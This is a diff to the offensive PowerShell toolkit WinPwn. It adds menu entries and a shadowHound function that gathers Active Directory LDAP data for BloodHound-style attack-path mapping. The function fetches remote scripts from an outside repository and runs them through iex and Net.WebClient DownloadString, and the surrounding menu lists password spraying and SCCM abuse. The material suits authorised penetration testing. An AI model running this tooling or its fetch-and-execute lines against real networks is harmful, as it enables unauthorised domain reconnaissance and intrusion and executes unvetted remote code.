@@ -2299,7 +2299,9 @@ __        ___       ____
         Write-Host -ForegroundColor Green '28. Check LDAP/LDAPS Signing and or Channel Binding'
         Write-Host -ForegroundColor Green '29. (Ab)use some SCCM stuff'
 	Write-Host -ForegroundColor Green '30. Spray pre2k passwords'
-        Write-Host -ForegroundColor Green '31. Go back '
+    Write-Host -ForegroundColor Green '31. Use ShadowHound (ADModule - ADWS) to collect BH data'
+    Write-Host -ForegroundColor Green '32. Use ShadowHound (LDAP search) to collect BH data'
+        Write-Host -ForegroundColor Green '33. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2336,9 +2338,52 @@ __        ___       ____
          28{LDAPChecksMenu}
          29{SCCMMenu}
 	 30{Domainpassspray -pre2k}
+     31{shadowHound -adm}
+     32{shadowhound}
        }
     }
-  While ($masterquestion -ne 31)
+  While ($masterquestion -ne 33)
+}
+
+function shadowHound
+{
+
+[CmdletBinding()]
+    Param (
+    [Switch]
+        $adm
+)
+
+if ($adm)
+{
+    iex ($admodule)  
+    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ShadowHound-Adm.ps1')
+
+     ShadowHound-ADM -OutputFilePath "$currentPath\DomainRecon\ldap_output_adws.txt" -SplitSearch -LetterSplitSearch
+
+
+     Write-Host "Data collected, now you need to parse them with BofHound or split.py"
+     Write-Host ""
+     Write-Host "python3 bofhound.py -i ldap_output_adws.txt -p All --parser ldapsearch"
+     Write-Host ""
+     Write-Host "Depending on the file size (>100MB), you may want to split the output JSON file using tools like ShredHound"
+
+}
+else
+{
+    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ShadowHound-DS.ps1')
+    ShadowHound-DS -OutputFile "$currentPath\DomainRecon\ldap_output.txt"
+
+     Write-Host "Data collected, now you need to parse them with BofHound or split.py"
+     Write-Host ""
+     Write-Host "python3 bofhound.py -i ldap_output.txt -p All --parser ldapsearch"
+     Write-Host ""
+     Write-Host "Depending on the file size (>100MB), you may want to split the output JSON file using tools like ShredHound"
+}
+
+
+
+
 }
 
 function SCCMMenu
